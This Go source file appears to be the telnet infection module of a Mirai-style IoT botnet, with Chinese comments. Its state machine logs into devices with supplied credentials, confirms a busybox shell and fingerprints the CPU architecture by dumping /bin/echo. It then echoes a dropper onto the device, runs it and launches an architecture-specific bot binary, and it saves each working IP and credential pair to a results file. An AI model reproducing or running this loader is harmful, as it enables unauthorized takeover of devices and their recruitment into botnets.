package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/wonderivan/logger"
)

var (
	TOKEN_QUERY    string = "/bin/busybox ECCHI\r\n"
	TOKEN_RESPONSE string = "applet not found"
)

const (
	statIDLE = iota
	statUserPrompt
	statPasswdPrompt
	statCheckLogin
	statVerifyLogin
	statDetectArch
	statExecDlr
	statExecBinary
	//statVerifyRun 不验证payload是否正确执行，出错拉倒
	statCleanup
)

// 判断字符串中是否存在":>$#%"登录标识
func connection_login_prompt(str string) bool {
	return strings.Contains(str, "ogin:") || strings.Contains(str, "name:") || strings.Contains(str, "ser:")
}

// 要么需要输入密码，要么直接进入shell
func connection_passwd_prompt(str string) bool {
	return strings.Contains(str, "word:") || connection_shell_prompt(str)
}
func connection_shell_prompt(str string) bool {
	return strings.ContainsAny(str, ">$#%")
}
func connection_notfound_prompt(str string) bool {
	return strings.Contains(str, TOKEN_RESPONSE)
}

func consume_arm_subtype(str string) bool {
	return strings.Contains(str, "ARMv7") || strings.Contains(str, "ARMv6")
}

func dialTelent(host string, username string, passwd string, timeout int) bool {
	t, err := NewTarget(host, username, passwd)
	if err != nil {
		return false
	}
	defer t.disConnect()

	go t.readConn()
	go t.writeConn()

	for {
		select {
		case readData := <-t.readChan:
			switch t.state {
			case statIDLE:
				if !t.telnetIACS(readData) {
					if connection_login_prompt(string(readData)) {
						t.Send([]byte(username + "\r\n"))
						t.state = statPasswdPrompt
					} else {
						t.state = statUserPrompt
					}
				}
			case statUserPrompt: //ubuntu login:
				if connection_login_prompt(string(readData)) {
					t.Send([]byte(username + "\r\n"))
					t.state = statPasswdPrompt
				}
			case statPasswdPrompt: //Password:
				if connection_passwd_prompt(string(readData)) {
					t.Send([]byte(passwd + "\r\n"))
					t.state = statCheckLogin
				}
			case statCheckLogin: //输入无效命令，检测是否有"... not found"
				if connection_shell_prompt(string(readData)) {
					t.Send([]byte(TOKEN_QUERY))
					t.state = statVerifyLogin
				}
			case statVerifyLogin: //检测存在"... not found", 执行ps命令
				if connection_notfound_prompt(string(readData)) {
					//t.Send([]byte("cat /bin/echo;" + TOKEN_QUERY))
					t.Send([]byte("cd /tmp ; dd if=/bin/echo bs=1 count=256 of=echo.bin ; cat echo.bin\r\n"))
					t.state = statDetectArch
				}
			case statDetectArch: //通过elf格式得到架构信息,并通过echo方式传递特定架构的dlr
				t.arch, err = ArchDetect(readData)
				if err == nil {
					if t.arch == "arm" {
						if consume_arm_subtype(string(readData)) {
							t.arch = "arm7"
						}

					}
					t.EchoDlr()
					t.state = statExecDlr
				}
			case statExecDlr: //通过echo方式下发wget
				if connection_notfound_prompt(string(readData)) {
					cmd := fmt.Sprintf("chmod +x %s; ./%s ; %s", FN_DROPPER, FN_DROPPER, TOKEN_QUERY)
					t.Send([]byte(cmd))
					t.state = statExecBinary
				}
			case statExecBinary:
				if connection_notfound_prompt(string(readData)) {
					cmd := fmt.Sprintf("chmod +x %s; ./%s telnet.%s", FN_BINARY, FN_BINARY, t.arch)
					t.Send([]byte(cmd))
					t.state = statCleanup
				}
			case statCleanup:
			}
		case <-t.stopChan:
			return false
		case <-t.timeoutChan:
			return false
		}
	}

}

func ipTelnet(ip string, mm string, ch chan bool) {
	logger.Info(ip, mm)
	info := strings.Split(mm, ":")
	if len(info) == 2 && dialTelent(ip, info[0], info[1], 20) {
		logFile, e := os.OpenFile("result.txt", os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0777)
		if e != nil {
			logger.Error("ip wirte failed %s:%s\n", ip, info[0], info[1])
		} else {
			logger.Error(ip + " " + mm + "\r\n")
			logFile.WriteString(ip + " " + mm + "\r\n")
			logFile.Close()
		}
	}

	ch <- true
}

func main() {
	ch := make(chan bool)

	logger.SetLogger(`{"File": {"filename": "test.log", 
						"level" : "WARN", 
						"permit":"0666", 
						"append":true, 
						"daily":true},
						
						"Console":{"Level" : "INFO",
						"color" : true}}`)

	go ipTelnet("192.168.1.109:23", "pi3:123", ch)
	<-ch

}
